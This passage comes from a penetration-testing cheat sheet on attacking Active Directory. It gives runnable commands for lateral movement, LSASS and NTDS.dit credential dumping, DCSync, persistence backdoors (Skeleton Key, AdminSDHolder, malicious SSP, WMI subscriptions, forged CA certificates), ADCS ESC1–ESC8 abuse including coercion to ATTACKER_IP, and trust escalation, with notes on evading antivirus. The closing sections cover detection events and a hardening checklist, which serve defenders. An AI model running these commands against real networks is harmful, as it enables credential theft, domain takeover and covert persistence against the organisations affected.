# Rubeus — request TGT directly
Rubeus.exe asktgt /user:administrator /rc4:HASH /ptt
Rubeus.exe asktgt /user:administrator /aes256:AES_HASH /ptt  # AES is stealthier
Rubeus.exe asktgt /user:administrator /rc4:HASH /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

### WMI Lateral Movement (T1047)

```bash
# ── Impacket ─────────────────────────────────────────────────────────────────
impacket-wmiexec corp.local/admin:password@TARGET01 "whoami"
impacket-wmiexec corp.local/admin:password@TARGET01 cmd  # Interactive shell
impacket-wmiexec -hashes :NTLM_HASH corp.local/admin@TARGET01 "cmd.exe /c net user"

# ── PowerShell WMI ───────────────────────────────────────────────────────────
$wmi = [wmiclass]"\\TARGET01\root\cimv2:Win32_Process"
$result = $wmi.Create("cmd.exe /c whoami > C:\Windows\Temp\output.txt")
$result.ReturnValue  # 0 = success

# With credentials
$cred = Get-Credential
Invoke-WmiMethod -ComputerName TARGET01 -Credential $cred -Class Win32_Process -Name Create -ArgumentList "powershell -enc BASE64"

# CIM (modern WMI)
$session = New-CimSession -ComputerName TARGET01 -Credential $cred
Invoke-CimMethod -CimSession $session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "cmd.exe /c whoami > C:\output.txt"}
```

### PSExec / SMBExec (T1021.002)

```bash
# Impacket PSExec (creates a service, noisier)
impacket-psexec corp.local/admin:password@TARGET01
impacket-psexec -hashes :NTLM_HASH corp.local/admin@TARGET01 cmd

# Impacket SMBExec (uses existing shares, stealthier)
impacket-smbexec corp.local/admin:password@TARGET01
impacket-smbexec -hashes :NTLM_HASH corp.local/admin@TARGET01

# NetExec with command execution
nxc smb TARGET01 -u admin -p password -x "net localgroup administrators"
nxc smb TARGET01 -u admin -p password --exec-method smbexec -x "whoami"
```

### WinRM / Evil-WinRM (T1021.006)

```bash
# Evil-WinRM — feature-rich WinRM shell
evil-winrm -i TARGET01 -u administrator -p password
evil-winrm -i TARGET01 -u administrator -H NTLM_HASH

# Evil-WinRM features
# File upload/download: upload /local/file.exe, download C:\remote\file.txt
# Load PS scripts: Bypass-4MSI, menu to load tools
# Pass Kerberos ticket: evil-winrm -i TARGET01 -r corp.local (uses KRB5CCNAME)

# Impacket WinRM
impacket-wmiexec -wmiport 5985 corp.local/admin:password@TARGET01  # Not directly, use evil-winrm

# PowerShell remoting
$cred = New-Object PSCredential("corp\admin", (ConvertTo-SecureString "password" -AsPlainText -Force))
Enter-PSSession -ComputerName TARGET01 -Credential $cred
Invoke-Command -ComputerName TARGET01 -Credential $cred -ScriptBlock {whoami; hostname}
```

### DCOM Lateral Movement (T1021.003)

```powershell
# MMC20.Application
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", "TARGET01"))
$com.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c powershell -enc BASE64", "7")

# ShellWindows
$com = [activator]::CreateInstance([type]::GetTypeFromCLSID([System.Guid]'9BA05972-F6A8-11CF-A442-00A0C90A8F39', "TARGET01"))
$item = $com.Item()
$item.Document.Application.ShellExecute("cmd.exe", "/c powershell -enc BASE64", "C:\Windows\System32", $null, 0)

# With credentials using alternate method
$cred = Get-Credential
$dcom = [System.Runtime.InteropServices.Marshal]::BindToMoniker("clsid:{9BA05972-F6A8-11CF-A442-00A0C90A8F39}@TARGET01")
```

---

## 6. Credential Harvesting

### LSASS Memory Extraction (T1003.001)

LSASS (Local Security Authority Subsystem Service) stores credentials for interactive and cached logons.

```bash
# ── LOL Binaries (avoid bringing own tools) ──────────────────────────────────
# comsvcs.dll MiniDump — no external tools, common false positive for AV
$lsass_pid = (Get-Process lsass).Id
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump $lsass_pid C:\Windows\Temp\lsass.dmp full

# ProcDump (signed Microsoft tool — often bypass AV)
procdump.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp
procdump64.exe -ma lsass.exe C:\Windows\Temp\lsass.dmp

# ── Task Manager method (GUI, requires interactive session) ──────────────────
# Task Manager → Details → lsass.exe → right-click → Create dump file

# ── Mimikatz in-memory ───────────────────────────────────────────────────────
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords    # Extract plaintext + NTLM from LSASS
mimikatz # sekurlsa::wdigest           # Force WDigest caching if enabled
mimikatz # sekurlsa::kerberos          # Kerberos credentials
mimikatz # sekurlsa::msv               # MSV (NTLM) credentials

# ── Parse dump file offline ──────────────────────────────────────────────────
# Mimikatz
mimikatz # sekurlsa::minidump C:\Windows\Temp\lsass.dmp
mimikatz # sekurlsa::logonpasswords

# Pypykatz (Linux)
pypykatz lsa minidump lsass.dmp
pypykatz lsa minidump lsass.dmp -o lsass_creds.json

# Rekall (from memory forensics, can process full memory dump)
python3 rekall/rekal.py --format lime -f memory.lime mimikatz
```

- **Detection**: Sysmon Event ID 10 (ProcessAccess) with TargetImage containing "lsass.exe" and GrantedAccess 0x1010 or 0x1038; EDR LSASS protection alerts; Windows Defender Credential Guard events
- **ATT&CK**: T1003.001
- **Defense**: Enable Credential Guard (virtualizes LSASS — extracts only blank values); Enable PPL (Protected Process Light) for LSASS (RunAsPPL=1 in registry); ASR rule "Block credential stealing from Windows local security authority subsystem" (GUID: 9e6c4e1f-7d60-472f-ba1a-a39ef669e4b0); Disable WDigest caching

### SAM Database Extraction (T1003.002)

SAM contains local account hashes (not domain hashes on domain-joined machines).

```bash
# Reg save (requires SYSTEM or local admin)
reg save HKLM\SAM C:\Windows\Temp\sam.bak
reg save HKLM\SYSTEM C:\Windows\Temp\system.bak
reg save HKLM\SECURITY C:\Windows\Temp\security.bak

# Transfer and parse offline
impacket-secretsdump -sam sam.bak -system system.bak -security security.bak LOCAL

# Remote extraction
impacket-secretsdump corp.local/administrator:password@TARGET01 -sam -system

# Impacket via SMB (will attempt VSS if needed)
impacket-secretsdump local_admin:password@TARGET01
```

### NTDS.dit Extraction (T1003.003)

NTDS.dit is the Active Directory database — contains all domain account hashes.

```bash
# ── Via ntdsutil (built-in, creates IFM backup) ──────────────────────────────
ntdsutil "activate instance ntds" "ifm" "create full C:\ntds_dump" quit quit
impacket-secretsdump -ntds "C:\ntds_dump\Active Directory\ntds.dit" -system "C:\ntds_dump\registry\SYSTEM" LOCAL

# ── Via Volume Shadow Copy ───────────────────────────────────────────────────
# Create VSS snapshot
vssadmin create shadow /for=C:
# Copy from shadow copy (adjust path)
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\system.bak

# ── Remote via Impacket ──────────────────────────────────────────────────────
impacket-secretsdump corp.local/administrator:password@DC01.corp.local
impacket-secretsdump -hashes :NTLM_HASH corp.local/administrator@DC01.corp.local

# ── CrackMapExec ─────────────────────────────────────────────────────────────
nxc smb DC01 -u administrator -p password --ntds       # Uses VSS automatically
nxc smb DC01 -u administrator -p password --ntds drsuapi  # DCSync method
```

### DCSync (T1003.006)

**Mechanism**: Replication protocol abuse. With DS-Replication permissions, request replication of a specific account from a DC. Mimics legitimate DC-to-DC replication. Does NOT require code execution on DC.

**Required rights**: GetChanges + GetChangesAll (DS-Replication-Get-Changes + DS-Replication-Get-Changes-All). Default holders: Domain Admins, Enterprise Admins, Domain Controllers, SYSTEM on DC. Also: Azure AD Connect account in hybrid environments.

```bash
# ── Mimikatz DCSync ──────────────────────────────────────────────────────────
mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
mimikatz # lsadump::dcsync /domain:corp.local /user:administrator
mimikatz # lsadump::dcsync /domain:corp.local /all /csv  # All accounts

# ── Impacket secretsdump ─────────────────────────────────────────────────────
# All users via DCSync
impacket-secretsdump -just-dc corp.local/administrator:password@DC01.corp.local
# Specific user
impacket-secretsdump -just-dc-user krbtgt corp.local/administrator:password@DC01.corp.local
# With hash
impacket-secretsdump -just-dc -hashes :NTLM_HASH corp.local/administrator@DC01.corp.local

# ── Grant DCSync rights (for persistence) ────────────────────────────────────
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" -PrincipalIdentity backdoor_user -Rights DCSync -Verbose
```

- **Detection**: Event 4662 on the DC with ObjectType GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2` (GetChangesAll) or `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2` (GetChanges), where the caller IP is NOT another DC
- **ATT&CK**: T1003.006
- **Defense**: Strict Tier 0 access control; monitor 4662 for non-DC sources; isolate Azure AD Connect server; regularly audit who has DS-Replication rights

---

## 7. Domain Persistence

### AdminSDHolder ACL Backdoor (T1546)

```powershell
# Grant backdoor_user GenericAll on AdminSDHolder
Add-DomainObjectAcl -TargetIdentity "CN=AdminSDHolder,CN=System,DC=corp,DC=local" `
  -PrincipalIdentity backdoor_user -Rights All -Verbose

# SDProp runs every 60 min — then backdoor_user has GenericAll on all protected groups
# Verify
Get-DomainObjectAcl "CN=AdminSDHolder,CN=System,DC=corp,DC=local" -ResolveGUIDs | where {$_.SecurityIdentifier -match "backdoor_user_SID"}

# Force immediate SDProp execution (requires DA)
$rootDSE = [ADSI]"LDAP://RootDSE"
$rootDSE.Put("FixUpInheritance", 1)
$rootDSE.SetInfo()
```

### SIDHistory Injection (T1134.005)

```bash
# Add privileged SID to user's SIDHistory (requires DA + mimikatz)
mimikatz # privilege::debug
mimikatz # misc::addsid backdoor_user S-1-5-21-PARENT-DOMAIN-519  # Enterprise Admin SID

# Verify SIDHistory
Get-ADUser backdoor_user -Properties SIDHistory | select SIDHistory
```

### Custom SSP (T1547.005)

```powershell
# In-memory SSP (credential capture, lost on reboot)
mimikatz # misc::memssp
# Credentials logged to C:\Windows\System32\mimilsa.log

# Persistent SSP (survives reboot)
# Drop malicious DLL to C:\Windows\System32\
# Add to HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages
$packages = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa").{'Security Packages'}
$packages += "mimilib"
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa" -Name 'Security Packages' -Value $packages
```

### Skeleton Key (T1556.001)

```bash
# Patches LSASS on the DC — accepts master password for ALL accounts
# Does not replace existing passwords; both work simultaneously
# Requires DA, reboot of DC removes it
mimikatz # privilege::debug
mimikatz # misc::skeleton
# Master password: "mimikatz"

# Now any domain user can authenticate as ANY account using "mimikatz" as password
# net use \\DC01\C$ /user:corp\administrator mimikatz
```

### WMI Event Subscription (T1546.003)

Persistent — survives reboots. Executes payload when condition met (e.g., system boot, time-based).

```powershell
# Create event filter (trigger condition)
$FilterArgs = @{
  Name          = "SystemBootFilter"
  EventNameSpace = "root\cimv2"
  QueryLanguage = "WQL"
  Query         = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
}
$Filter = Set-WmiInstance -Class __EventFilter -Namespace "root\subscription" -Arguments $FilterArgs

# Create consumer (action)
$ConsumerArgs = @{
  Name                = "SystemBootConsumer"
  CommandLineTemplate = "C:\Windows\System32\cmd.exe /c powershell.exe -enc BASE64_PAYLOAD"
}
$Consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments $ConsumerArgs

# Bind filter to consumer
$BindingArgs = @{Filter = $Filter; Consumer = $Consumer}
Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments $BindingArgs

# Verify subscriptions
Get-WMIObject -Namespace root\subscription -Class __EventFilter
Get-WMIObject -Namespace root\subscription -Class CommandLineEventConsumer
Get-WMIObject -Namespace root\subscription -Class __FilterToConsumerBinding

# Remove (cleanup)
Get-WMIObject -Namespace root\subscription -Class __EventFilter -Filter "Name='SystemBootFilter'" | Remove-WmiObject
```

- **Detection**: Sysmon Event 19 (WmiEventFilter activity), Event 20 (WmiEventConsumer), Event 21 (WmiEventConsumerToFilter binding)

### Golden Certificate (T1553 / CA Backdoor)

```bash
# Export CA private key
mimikatz # crypto::certificates /systemstore:local_machine /export
# Or via Certipy
certipy ca -backup -ca 'corp-CA' -username administrator@corp.local -password password
# Output: corp-CA.pfx

# Forge certificate for any user
certipy forge -ca-pfx corp-CA.pfx -upn administrator@corp.local -subject "CN=Administrator"
# Authenticate with forged cert
certipy auth -pfx administrator_forged.pfx -dc-ip 192.168.1.10
```

### DSRMAdmin Persistence (T1003)

The Directory Services Restore Mode (DSRM) password is a local admin password on each DC. If it can be set and DSRM login is enabled over network:

```powershell
# Set new DSRM password (requires DA)
ntdsutil "set dsrm password" "reset password on server DC01" quit quit

# Enable DSRM network logon
New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
# Value 0: DSRM only in DSRM mode
# Value 1: DSRM if DC services stopped
# Value 2: DSRM always (dangerous — enables local admin backdoor)

# With PtH using DSRM hash
impacket-secretsdump -sam -system corp.local/administrator@DC01  # Get DSRM hash
impacket-psexec -hashes :DSRM_NTLM_HASH DC01\administrator@DC01
```

---

## 8. AD Certificate Services (ADCS) Attacks — ESC1–ESC8

Reference: "Certified Pre-Owned" (SpecterOps, Will Schroeder & Lee Christensen, 2021)

```bash
# Enumerate ADCS vulnerabilities
certipy find -u user@corp.local -p password -dc-ip 192.168.1.10
certipy find -u user@corp.local -p password -dc-ip 192.168.1.10 -vulnerable -stdout
# Or BloodHound with ADCS data: bloodhound-python with --collect all-with-certificates
```

### ESC1 — Enrollee Supplies Subject (SAN)

**Condition**: Certificate template allows requester to specify Subject Alternative Name; enrollee supplies subject = True; low-privilege enrollment rights.

```bash
certipy find -u user@corp.local -p password -dc-ip 192.168.1.10
# Look for: [!] Vulnerabilities → ESC1

# Request cert with admin UPN in SAN
certipy req -ca 'corp-CA' -template VulnerableTemplate -upn administrator@corp.local -u user@corp.local -p password
# Output: administrator.pfx

# Authenticate with certificate → get TGT + NTLM hash
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

### ESC2 — Any Purpose EKU

**Condition**: Template has "Any Purpose" or no EKU restriction — can be used for any purpose including client authentication.

```bash
# Certificate can be used for smartcard auth
certipy req -ca 'corp-CA' -template ESC2Template -u user@corp.local -p password
certipy auth -pfx user.pfx
```

### ESC3 — Enrollment Agent Template Abuse

**Condition**: Template allows enrollment agent + another template allows enrollment agent to enroll on behalf of others.

```bash
# Step 1: Get enrollment agent certificate
certipy req -ca 'corp-CA' -template EnrollmentAgentTemplate -u user@corp.local -p password
# Output: user.pfx (enrollment agent cert)

# Step 2: Use enrollment agent cert to request cert on behalf of admin
certipy req -ca 'corp-CA' -template User -on-behalf-of corp\\administrator -pfx user.pfx -u user@corp.local -p password
certipy auth -pfx administrator.pfx -dc-ip 192.168.1.10
```

### ESC4 — Vulnerable Certificate Template ACL

**Condition**: Attacker has write access to a certificate template object (e.g., GenericAll, GenericWrite, WriteProperty).

```bash
# Modify template to add enrollee-supplied subject (ESC1-style)
certipy template -u user@corp.local -p password -template VulnTemplate -save-old
certipy template -u user@corp.local -p password -template VulnTemplate -configuration 'mspki-certificate-name-flag = (ENROLLEE_SUPPLIES_SUBJECT)'
# Then exploit as ESC1
certipy req -ca 'corp-CA' -template VulnTemplate -upn administrator@corp.local -u user@corp.local -p password
certipy auth -pfx administrator.pfx
```

### ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2 Flag on CA

**Condition**: CA is configured with EDITF_ATTRIBUTESUBJECTALTNAME2 flag — allows any template's requests to include SAN even if template doesn't require it.

```bash
# Check CA configuration
certipy find -u user@corp.local -p password -dc-ip 192.168.1.10
# Look for: UserSpecifiedSAN: Enabled

# Exploit — request any template with admin UPN
certipy req -ca 'corp-CA' -template User -upn administrator@corp.local -u user@corp.local -p password
certipy auth -pfx administrator.pfx
```

### ESC7 — Vulnerable CA ACL

**Condition**: Attacker has ManageCA or ManageCertificates rights on the CA object.

```bash
# Add yourself as CA officer to enable ManageCertificates
certipy ca -ca 'corp-CA' -add-officer user -u user@corp.local -p password

# Enable EDITF_ATTRIBUTESUBJECTALTNAME2 (ESC6) on CA
certipy ca -ca 'corp-CA' -enable-flag EDITF_ATTRIBUTESUBJECTALTNAME2 -u user@corp.local -p password

# Issue failed/pending certificate requests
certipy ca -ca 'corp-CA' -issue-request 12 -u user@corp.local -p password
```

### ESC8 — NTLM Relay to AD CS HTTP Enrollment

**Condition**: CA has Web Enrollment (certsrv) enabled without EPA; HTTPS not enforced or NTLM relay is possible.

```bash
# Step 1: Start relay targeting ADCS web enrollment
impacket-ntlmrelayx -t http://CA.corp.local/certsrv/certfnsh.asp -smb2support --adcs --template Machine

# Step 2: Coerce DC authentication (SpoolSample/PetitPotam)
python3 printerbug.py corp.local/user:password@DC01.corp.local ATTACKER_IP
# OR
python3 PetitPotam.py ATTACKER_IP DC01.corp.local  # unauthenticated if unpatched

# Step 3: Certificate issued for DC machine account — get DC's TGT
# Output from ntlmrelayx: base64 certificate
certipy auth -pfx DC01.pfx -dc-ip 192.168.1.10  # Authenticate as DC01$
# With DC's TGT → DCSync
impacket-secretsdump -k -no-pass corp.local/DC01\$@DC01.corp.local
```

- **Detection**: Events 4886 (certificate requested), 4887 (certificate issued), 4768/4769 with machine account for unexpected hosts; CA audit logging enabled
- **Defense**: Disable Web Enrollment or require HTTPS with EPA; disable EDITF_ATTRIBUTESUBJECTALTNAME2; review template ACLs; enable CA audit logging; use Certipy or PKI Health Tool regularly

---

## 9. Domain Trust Attacks

### Trust Types

| Type | Direction | Filter | Notes |
|------|-----------|--------|-------|
| Parent-Child | Bidirectional, transitive | SID filtering disabled by default | Default between parent and child domain |
| Tree-Root | Bidirectional, transitive | SID filtering disabled | Between tree root and forest root |
| Forest | Configurable | SID filtering enabled by default | Cross-forest explicit trust |
| External | Non-transitive | SID filtering enabled | Trust with external NT domain |
| Realm | Non-transitive | Configurable | Kerberos realm (Linux/macOS) |

### Child Domain to Parent Domain Escalation

```bash
# Step 1: Get child domain's krbtgt hash (requires DA in child domain)
impacket-secretsdump -just-dc-user krbtgt child.corp.local/administrator:password@CHILDDC.child.corp.local

# Step 2: Get Enterprise Admin SID from parent domain
impacket-lookupsid corp.local/user:password@DC01.corp.local | grep "Enterprise Admin"
# OR enumerate from child: Get-ADGroup "Enterprise Admins" -Server corp.local

# Step 3: Forge inter-realm TGT with SIDHistory containing root domain EA SID
# Mimikatz Golden Ticket with /sids for SIDHistory injection
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:CHILD_DOMAIN_SID /sids:ROOT_ENTERPRISE_ADMIN_SID /krbtgt:CHILD_KRBTGT_HASH /ptt

# Step 4: Access parent domain resources
ls \\DC01.corp.local\C$
impacket-secretsdump corp.local/administrator@DC01.corp.local  # Using PTT
```

### Trust Ticket Attack

```bash
# Get inter-realm trust key (trust account hash)
mimikatz # lsadump::dcsync /domain:child.corp.local /user:corp$  # Trust account name

# Forge inter-realm TGT
mimikatz # kerberos::golden /user:Administrator /domain:child.corp.local /sid:CHILD_SID /sids:ROOT_EA_SID /rc4:TRUST_KEY /service:krbtgt /target:corp.local /ptt
```

### SID Filtering

```bash
# Check if SID filtering is enabled on a trust
# netdom trust child.corp.local /domain:corp.local /quarantine:Yes  — enables SID filtering
# netdom trust child.corp.local /domain:corp.local /quarantine:No   — disables SID filtering

# Check via PowerShell
Get-ADTrust -Filter * | select Name, SIDFilteringQuarantined, SIDFilteringForestAware
```

### PAM Trust Abuse

```powershell
# Privileged Access Management trust creates ShadowPrincipal objects
# Used in bastion forests for time-limited privileged access
Get-ADObject -SearchBase "CN=Shadow Principal Configuration,CN=Services,CN=Configuration,DC=corp,DC=local" -Filter * -Properties *
```

---

## 10. Tools Quick Reference

| Tool | Purpose | Platform | Source |
|------|---------|----------|--------|
| **BloodHound** | Attack path analysis / graph visualization | Windows/Linux | github.com/BloodHoundAD/BloodHound |
| **SharpHound** | BloodHound data collector (.NET) | Windows | github.com/BloodHoundAD/SharpHound |
| **bloodhound-python** | Python BloodHound collector | Linux | github.com/fox-it/BloodHound.py |
| **PowerView** | AD enumeration (PowerShell) | Windows | github.com/PowerShellMafia/PowerSploit |
| **Rubeus** | Kerberos attack toolkit (.NET) | Windows | github.com/GhostPack/Rubeus |
| **Mimikatz** | Credential extraction, ticket attacks | Windows | github.com/gentilkiwi/mimikatz |
| **Impacket** | Full AD attack suite (Python) | Linux | github.com/fortra/impacket |
| **NetExec (nxc)** | AD pentesting automation | Linux/Windows | github.com/Pennyw0rth/NetExec |
| **CrackMapExec** | AD pentesting (older, nxc fork) | Linux | github.com/byt3bl33d3r/CrackMapExec |
| **Certipy** | ADCS attack and enumeration | Linux | github.com/ly4k/Certipy |
| **Responder** | LLMNR/NBT-NS/mDNS/WPAD poisoning | Linux | github.com/lgandx/Responder |
| **Evil-WinRM** | WinRM shell with upload/download | Linux | github.com/Hackplayers/evil-winrm |
| **kerbrute** | Kerberos user enum + password spray | Linux/Windows | github.com/ropnop/kerbrute |
| **ldapdomaindump** | LDAP enumeration to HTML/JSON/CSV | Linux | github.com/dirkjanm/ldapdomaindump |
| **PingCastle** | AD security audit and scoring | Windows | pingcastle.com |
| **ADRecon** | Comprehensive AD recon (PowerShell) | Windows | github.com/adrecon/ADRecon |
| **Powermad** | Machine account creation + AD manipulation | Windows | github.com/Kevin-Robertson/Powermad |
| **Coercer** | Authentication coercion (multi-protocol) | Linux | github.com/p0dalirius/Coercer |
| **mitm6** | IPv6 DNS poisoning for NTLM relay | Linux | github.com/dirkjanm/mitm6 |
| **pypykatz** | Mimikatz reimplementation in Python | Linux | github.com/skelsec/pypykatz |
| **SharpDPAPI** | DPAPI secrets, credential files, certificates | Windows | github.com/GhostPack/SharpDPAPI |
| **SpoolSample** | PrinterBug / authentication coercion | Windows | github.com/leechristensen/SpoolSample |
| **PetitPotam** | EFSRPC-based coercion (unauth in some versions) | Linux | github.com/topotam/PetitPotam |
| **lsassy** | Remote LSASS dump parser | Linux | github.com/Hackndo/lsassy |

---

## 11. Detection & Defense Summary

| Attack | ATT&CK ID | Key Event IDs | Detection Method | Primary Defense |
|--------|-----------|---------------|-----------------|-----------------|
| **Kerberoasting** | T1558.003 | 4769 (RC4, high volume) | TGS requests with EType 0x17 from non-DC source | gMSA; AES-only for SPN accounts |
| **AS-REP Roasting** | T1558.004 | 4768 (PreAuth=0) | TGT requests with PreAuth type 0 | Require pre-auth on all accounts |
| **Golden Ticket** | T1558.001 | 4769 (anomalous params) | Ticket lifetime >10h, KVNO anomaly | Rotate krbtgt 2x; Credential Guard |
| **Silver Ticket** | T1558.002 | No 4768/4769 from DC | Missing corresponding TGS request | PAC validation; rotate svc passwords |
| **DCSync** | T1003.006 | 4662 (GUID match) | Replication from non-DC IP | Tier 0 access; monitor 4662 |
| **Pass-the-Hash** | T1550.002 | 4624 Type3 NTLM | NTLM auth from unexpected source | Credential Guard; Protected Users |
| **LLMNR Poisoning** | T1557.001 | Network traffic | LLMNR response from non-DNS server | Disable LLMNR/NBT-NS |
| **NTLM Relay** | T1557.001 | Network traffic | Relay pattern in network logs | SMB signing required; EPA |
| **ADCS ESC1** | T1649 | 4886, 4887 | Cert issued with unexpected SAN | Disable enrollee supplies subject |
| **BloodHound/enum** | T1087.002 | High LDAP query volume | AD audit + UEBA baseline deviation | LDAP query rate limiting; canary accounts |
| **Unconstrained Deleg.** | T1558 | 4769 (machine account TGT) | Machine account authenticating to non-standard host | Remove unconstrained delegation; monitor |
| **WMI Persistence** | T1546.003 | Sysmon 19/20/21 | WMI subscription creation | Monitor WMI subscriptions; restrict WMI |
| **AdminSDHolder** | T1546 | 4662 (SDProp) | ACE added to AdminSDHolder | Monitor AdminSDHolder ACL changes |
| **LSASS Dump** | T1003.001 | Sysmon 10 (LSASS access) | ProcessAccess to lsass.exe | Credential Guard; PPL; ASR rules |
| **Password Spray** | T1110.003 | 4625 (burst from one IP) | Failed logon spike; smart lockout trigger | Smart lockout; Entra Password Protection |

### Event ID Quick Reference

| Event ID | Log | Description |
|----------|-----|-------------|
| 4624 | Security | Successful logon (check Type and AuthPackage) |
| 4625 | Security | Failed logon (account lockout spray detection) |
| 4648 | Security | Logon with explicit credentials |
| 4662 | Security | Operation performed on AD object (DCSync, AdminSDHolder) |
| 4663 | Security | File access (NTDS.dit access) |
| 4672 | Security | Special privileges assigned to new logon |
| 4768 | Security | Kerberos TGT request (4768 with preauth=0 = AS-REP roast target) |
| 4769 | Security | Kerberos service ticket request (RC4 = Kerberoasting) |
| 4771 | Security | Kerberos pre-authentication failure |
| 4776 | Security | NTLM credential validation (NTLM auth at DC) |
| 4886 | Security | Certificate requested (ADCS) |
| 4887 | Security | Certificate issued (ADCS) |
| 7045 | System | New service installed (PSExec indicator) |
| Sysmon 1 | Microsoft-Windows-Sysmon | Process creation (command line logging) |
| Sysmon 3 | Microsoft-Windows-Sysmon | Network connection |
| Sysmon 10 | Microsoft-Windows-Sysmon | ProcessAccess (LSASS dumps) |
| Sysmon 19 | Microsoft-Windows-Sysmon | WMI EventFilter created |
| Sysmon 20 | Microsoft-Windows-Sysmon | WMI EventConsumer created |
| Sysmon 21 | Microsoft-Windows-Sysmon | WMI FilterToConsumer binding |

### Priority Hardening Checklist

```
[ ] Enable SMB signing required (prevents NTLM relay)
[ ] Enable LDAP signing + channel binding (prevents LDAP relay)
[ ] Disable LLMNR via GPO
[ ] Disable NBT-NS via DHCP option 001 or network adapter settings
[ ] Deploy Windows Defender Credential Guard on Tier 0 machines
[ ] Add Tier 0 accounts to Protected Users group
[ ] Enable PPL for LSASS (RunAsPPL = 1)
[ ] Migrate service accounts with SPNs to gMSA
[ ] Set msDS-SupportedEncryptionTypes = 24 (AES only) on service accounts
[ ] Disable Kerberos pre-auth only where absolutely required (audit regularly)
[ ] Review and restrict unconstrained delegation — remove where not needed
[ ] Enable ADCS audit logging (Events 4886/4887)
[ ] Audit CA template ACLs with Certipy regularly
[ ] Implement Tiered Administration Model (Tier 0/1/2 isolation)
[ ] Rotate krbtgt password regularly (at least annually, twice with 10h gap)
[ ] Deploy Microsoft LAPS for local admin accounts
[ ] Enable Advanced Audit Policy on DCs (especially Object Access, Account Logon)
[ ] Deploy Sysmon on all domain-joined machines
[ ] Ingest DC security events into SIEM with DCSync and AS-REP roast detection rules
[ ] Run BloodHound regularly and remediate shortest paths to DA
[ ] Run PingCastle monthly for AD health scoring
```

---

## References

- [MITRE ATT&CK Enterprise — Credential Access](https://attack.mitre.org/tactics/TA0006/)
- [SpecterOps — Certified Pre-Owned (ADCS)](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf)
- [Microsoft — Protecting Privileged Accounts](https://docs.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/implementing-least-privilege-administrative-models)
- [BloodHound Documentation](https://bloodhound.readthedocs.io/)
- [Harmj0y — The Trustpocalypse (Domain Trusts)](https://www.harmj0y.net/blog/redteaming/the-trustpocalypse/)
- [gentilkiwi — Mimikatz Documentation](https://github.com/gentilkiwi/mimikatz/wiki)
- [Impacket Examples](https://github.com/fortra/impacket/tree/master/examples)
- [adsecurity.org — Sean Metcalf's AD Security Research](https://adsecurity.org/)
- [dirkjanm.io — Kerberos, NTLM, and AD Research](https://dirkjanm.io/)
